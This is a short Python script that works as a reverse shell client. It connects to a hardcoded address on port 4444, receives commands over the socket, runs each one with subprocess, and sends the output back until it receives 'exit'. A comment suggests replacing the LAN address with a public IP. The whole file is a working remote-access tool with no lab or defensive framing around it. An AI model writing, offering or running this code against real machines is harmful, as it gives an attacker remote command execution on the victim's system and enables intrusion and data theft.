import socket
import subprocess

# LAN address can be replaced by a public IP of your wifi
server_ip = "192.168.1.6"
server_port = 4444

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try: 
    client_socket.connect((server_ip, server_port))

    while True:
        command = client_socket.recv(1024).decode("utf-8")

        if command.lower() == 'exit':
            break
        output = subprocess.getoutput(command)

        client_socket.send(output.encode("utf-8"))

    client_socket.close()
except Exception as e:
    print(f"Erro: {e}")
    client_socket.close()